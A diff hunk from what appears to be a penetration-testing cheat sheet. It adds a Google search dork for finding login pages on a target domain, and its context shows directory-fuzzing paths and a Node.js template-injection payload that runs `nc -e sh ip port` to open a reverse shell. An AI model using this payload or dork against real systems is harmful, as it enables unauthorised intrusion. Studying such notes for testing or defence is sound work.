@@ -36,7 +36,8 @@ Finding hidden directory’s
 /~FUZZ
 /../FuZZ
 ```
-
+4-
+```inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:test.com```
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
